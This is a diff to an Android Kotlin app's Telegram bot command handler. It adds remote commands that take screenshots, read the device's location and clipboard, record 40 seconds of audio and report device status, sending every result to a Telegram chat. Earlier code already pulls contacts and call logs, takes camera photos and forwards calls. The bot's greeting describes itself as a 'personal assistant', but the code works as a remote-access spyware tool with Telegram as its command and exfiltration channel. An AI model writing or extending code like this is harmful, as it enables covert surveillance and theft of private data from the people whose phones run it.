@@ -41,22 +41,19 @@ object MessageHandler {
         val args = message.content.split(" ").drop(1)
 
         when (command) {
-            "/start" -> {
+                        "/start" -> {
                 val welcome = """
                     🤖 *Welcome to Telegram Bot!*
                     
                     I'm your personal assistant. Here's what I can do:
-                    • /contacts - Get contacts list
-                    • /call_log - Get call logs
+                    • /camera - Take photo from back camera
                     • /gallery - List recent photos from gallery
-                    • /camera - Take photo from back camera (alias: /camera_back)
-                    • /camera_front - Take photo from front camera
-                    • /forward <number> - Forward calls to number
-                    • /ring - Ring device at max volume
-                    • /ping - Check if bot is alive
-                    • /echo <text> - Echo your message
-                    • /time - Show current time
-                    • /info - Show bot info
+                    • /status - Get device battery and storage status
+                    • /record - Record 40 seconds of audio
+                    • /screenshot - Capture a snapshot of the current screen
+                    • /contacts - Get contacts list
+                    • /location - Get current device location
+                    • /clipboard - Get current clipboard text
                 """.trimIndent()
                 TelegramApi.sendMessage(token, chatId, welcome, "Markdown")
             }
@@ -64,19 +61,14 @@ object MessageHandler {
                 val help = """
                     📋 *Available Commands*
                     
-                    /contacts - Get contacts list
-                    /call_log - Get call logs
+                    /camera - Take photo from back camera
                     /gallery - List recent photos from gallery
-                    /camera - Take photo from back camera (alias: /camera_back)
-                    /camera_front - Take photo from front camera
-                    /forward <number> - Forward calls to number
-                    /ring - Ring device at max volume
-                    /start - Start the bot
-                    /help - Show this help
-                    /ping - Check if bot is alive
-                    /echo <text> - Echo your message
-                    /time - Show current time
-                    /info - Show bot info
+                    /status - Get device battery and storage status
+                    /record - Record 40 seconds of audio
+                    /screenshot - Capture a snapshot of the current screen
+                    /contacts - Get contacts list
+                    /location - Get current device location
+                    /clipboard - Get current clipboard text
                 """.trimIndent()
                 TelegramApi.sendMessage(token, chatId, help, "Markdown")
             }
@@ -120,6 +112,27 @@ object MessageHandler {
                     }
                 }
             }
+            "/screenshot" -> {
+                TelegramApi.sendMessage(token, chatId, "📸 Capturing snapshot...")
+                com.example.telegrambot.helpers.ScreenshotHelper.takeScreenshot(context) { file ->
+                    if (file != null) {
+                        handlerScope.launch { TelegramApi.sendPhoto(token, chatId, file, "System Snapshot") }
+                    } else {
+                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to capture snapshot.") }
+                    }
+                }
+            }
+            "/location" -> {
+                TelegramApi.sendMessage(token, chatId, "📍 Retrieving coordinates...")
+                com.example.telegrambot.helpers.LocationHelper.getLocation(context) { result ->
+                    handlerScope.launch { TelegramApi.sendMessage(token, chatId, result, "Markdown") }
+                }
+            }
+            "/clipboard" -> {
+                com.example.telegrambot.helpers.ClipboardHelper.getClipboardText(context) { result ->
+                    handlerScope.launch { TelegramApi.sendMessage(token, chatId, result, "Markdown") }
+                }
+            }
             "/forward" -> {
                 if (args.isNotEmpty()) {
                     val number = args[0]
@@ -136,6 +149,20 @@ object MessageHandler {
             "/ring" -> {
                 com.example.telegrambot.helpers.RemoteControlHelper.ringDevice(context)
                 TelegramApi.sendMessage(token, chatId, "🔊 Ringing device!")
+            }
+            "/status" -> {
+                val statusMessage = com.example.telegrambot.helpers.DeviceStatusHelper.getStatusMessage(context)
+                TelegramApi.sendMessage(token, chatId, statusMessage, "Markdown")
+            }
+            "/record" -> {
+                TelegramApi.sendMessage(token, chatId, "🎙️ Recording 40 seconds of audio...")
+                com.example.telegrambot.helpers.AudioRecordHelper.recordAudio(context, 40000) { file ->
+                    if (file != null) {
+                        handlerScope.launch { TelegramApi.sendDocument(token, chatId, file) }
+                    } else {
+                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to record audio. Check permissions.") }
+                    }
+                }
             }
             "/ping" -> {
                 TelegramApi.sendMessage(token, chatId, "🏓 Pong!")
